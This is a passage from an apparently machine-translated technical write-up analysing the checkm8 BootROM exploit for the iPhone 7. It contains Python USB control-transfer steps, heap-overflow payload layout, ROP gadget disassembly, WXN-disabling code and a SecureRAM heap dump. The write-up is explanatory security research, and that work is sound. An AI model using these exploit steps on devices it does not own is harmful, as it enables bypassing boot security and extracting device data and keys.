hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p> 您可以通过分析<code>SecureRAM</code>获得的<code>SecureRAM</code>堆的当前状态来检查这些结论的有效性。 为此，我们编写了一个简单的脚本来解析堆的转储并枚举块。 请记住，在<code>usb_device_io_request</code>溢出期间，部分元数据已损坏，因此我们在分析期间将其跳过。 </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): # skipping damaged chunks this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p> 脚本的输出和注释可以在破坏器下找到。 您可以看到低位字节与仿真结果匹配。 </p><br><div class="spoiler">  <b class="spoiler_title">在SecureRAM中解析堆的结果</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p> You can also achieve an interesting effect by overflowing the configuration descriptors <code>High Speed</code> and <code>Full Speed</code> that are located right after the <code>IO</code> buffer. One of the fields of a configuration descriptor is responsible for its overall length. By overflowing this field, we can read beyond the descriptor. You can try and do it yourself by modifying the exploit. </p><br><h2 id="2-allocation-and-freeing-of-the-io-buffer-without-clearing-the-global-state"> 2. Allocation and freeing of the IO buffer without clearing the global state </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p> At this stage, an incomplete <code>OUT</code> request for uploading the image is created. At the same time, a global state is initialized, and the address of the buffer in the heap is written to the <code>io_buffer</code> . Then, <code>DFU</code> is reset with a <code>DFU_CLR_STATUS</code> request, and a new iteration of <code>DFU</code> begins. </p><br><h2 id="3-overwriting-usb_device_io_request-in-the-heap-with-use-after-free"> 3. Overwriting <code>usb_device_io_request</code> in the heap with <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, a <code>usb_device_io_request</code> type object is allocated in the heap, and it is overflown with <code>t8010_overwrite</code> , whose content was defined at the first stage. </p><br><p> The values of <code>t8010_nop_gadget</code> and <code>0x1800B0800</code> should overflow the fields <code>callback</code> and <code>next</code> of the <code>usb_device_io_request</code> structure. </p><br><p> <code>t8010_nop_gadget</code> is shown below and conforms to its name, but besides function return, the previous <code>LR</code> register is restored, and because of that the call <code>free</code> is skipped after the <code>callback</code> function in <code>usb_core_complete_endpoint_io</code> . This is important, because we damage the heap's metadata due to overflow, which would affect the exploit in case of a freeing attempt. </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code> points to <code>INSECURE_MEMORY + 0x800</code> . Later, <code>INSECURE_MEMORY</code> will store the exploit's payload, and at the offset of <code>0x800</code> in the payload, there is a <code>callback-chain</code> , which we'll discuss later on. </p><br><h2 id="4-placing-the-payload"> 4. Placing the payload </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, every following packet is put into the memory area allocated for the image. The payload looks like this: </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode # initializing shell-code ... 0x1800B0180: t8010_handler # new usb request handler ... 0x1800B0400: 0x1000006a5 # fake translation table descriptor # corresponds to SecureROM (0x100000000 -&gt; 0x100000000) # matches the value in the original translation table ... 0x1800B0600: 0x60000180000625 # fake translation table descriptor # corresponds to SecureRAM (0x180000000 -&gt; 0x180000000) # matches the value in the original translation table 0x1800B0608: 0x1800006a5 # fake translation table descriptor # new value translates 0x182000000 into 0x180000000 # plus, in this descriptor,there are rights for code execution 0x1800B0610: disabe_wxn_arm64 # code for disabling WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-execution-of-callback-chain"> 5. Execution of <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p> After <code>USB</code> reset, the loop of canceling incomplete <code>usb_device_io_request</code> in the queue by going through a linked list is started. In the previous stages, we replaced the rest of the queue, which allows us to control the <code>callback</code> chain. To build this chain, we use this gadget: </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18↑j bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48↑j bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> As you can see, at the offset of <code>0x70</code> from the pointer to the structure, the call's address and its first argument are loaded. With this gadget, we can easily make any <code>f(x)</code> type calls for arbitrary <code>f</code> and <code>x</code> . </p><br><p> The entire call chain can be easily emulated with <code>Unicorn Engine</code> . We did it with our modified version of the plugin <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p> The results of the entire chain for <code>iPhone 7</code> can be found below. </p><br><h4 id="51-dc_civac-0x1800b0600"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p> Clearing and invalidating the processor's cache at a virtual address. This will make the processor address our payload later. </p><br><h4 id="52-dmb"> 5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p> A memory barrier that guarantees the completion of all operations with the memory done before this instruction. Instructions in high-performance processors can be executed in an order different from the programmed one for the purpose of optimization. </p><br><h4 id="53-enter_critical_section"> 5.3. <code>enter_critical_section()</code> </h4><br><p> Then, interrupts are masked for the atomic execution of further operations. </p><br><h4 id="54-write_ttbr00x1800b0000"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> A new value of the table register <code>TTBR0_EL1</code> is set in <code>0x1800B0000</code> . It is the address of <code>INSECURE MEMORY</code> where the exploit's payload is stored. As was mentioned before, the translation descriptors are located at certain offsets in the payload: </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi"> 5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p> The translation table is invalidated in order to translate addresses according to our new translation table. </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64">  5.6。 <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p> <code>WXN</code> (Write permission implies Execute-never) is disabled to allow us execute code in <code>RW</code> memory. The execution of the <code>WXN</code> disabling code is possible due to the modified translation table. </p><br><h4 id="57-write_ttbr00x1800a0000"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> The original value of the <code>TTBR0_EL1</code> translation register is restored. It is necessary for the correct operation of <code>BootROM</code> during the translation of virtual addresses because the data in <code>INSECURE_MEMORY</code> will be overwritten. </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p> The translation table is reset again. </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p> Interrupt handling is back to normal. </p><br><h4 id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p> Control is transferred to the initializing <code>shellcode</code> . </p><br><p> Thus, the main task of <code>callback-chain</code> is to disable <code>WXN</code> and transfer control to the <code>shellcode</code> in <code>RW</code> memory. </p><br><h2 id="6-execution-of-shellcode"> 6. Execution of <code>shellcode</code> </h2><br><p> The <code>shellcode</code> is in <code>src/checkm8_arm64.S</code> and does the following: </p><br><h4 id="61-overwriting-usb-configuration-descriptors"> 6.1. Overwriting <code>USB</code> configuration descriptors </h4><br><p> In the global memory, two pointers to configuration descriptors <code>usb_core_hs_configuration_descriptor</code> and <code>usb_core_fs_configuration_descriptor</code> located in the heap are stored. In the third stage, these descriptors were damaged. They are necessary for the correct interaction with a <code>USB</code> device, so the <code>shellcode</code> restores them. </p><br><h4 id="62-changing-usbserialnumber"> 6.2. Changing <code>USBSerialNumber</code> </h4><br><p> A new string descriptor with a serial number is created with a substring <code>" PWND:[checkm8]"</code> added to it. This will help us understand if the exploit was successful. </p><br><h4 id="63-overwriting-the-pointer-of-the-usb-request-handler"> 6.3. Overwriting the pointer of the <code>USB</code> request handler </h4><br><p> The original pointer to the handler of <code>USB</code> requests to the interface is overwritten by a pointer to a new handler, which will be placed in the memory at the next step. </p><br><h4 id="64-copying-usb-request-handler-into-trampoline-memory-area-0x1800afc00"> 6.4. Copying <code>USB</code> request handler into <code>TRAMPOLINE</code> memory area ( <code>0x1800AFC00</code> ) </h4><br><p> Upon receiving a <code>USB</code> request, the new handler checks the <code>wValue</code> of the request against <code>0xffff</code> and if they're not equal, it transfers control back to the original handler. If they are equal, various commands can be executed in the new handlers, like <code>memcpy</code> , <code>memset</code> , and <code>exec</code> (calling an arbitrary address with an arbitrary set of arguments). </p><br><p> Thus, the analysis of the exploit is complete. </p><br><h2 id="the-implementation-of-the-exploit-at-a-lower-level-of-working-with-usb"> The implementation of the exploit at a lower level of working with USB </h2><br><p> As a bonus and an example of the attack at lower levels, we published a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Proof-of-Concept</a> of the <code>checkm8</code> implementation on <code>Arduino</code> with <code>USB Host Shield</code> . The PoC works only for <code>iPhone 7</code> but can be easily ported to other devices. When an <code>iPhone 7</code> in <code>DFU</code> mode is connected to <code>USB Host Shield</code> , all the steps described in this article will be executed, and the device will enter <code>PWND:[checkm8]</code> mode. Then, it can be connected to a PC via <code>USB</code> to work with it using <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfu</a> (to dump memory, use crypto keys, etc.). This method is more stable than using asynchronous requests with a minimal timeout because we work directly with the <code>USB</code> controller. We used the <a 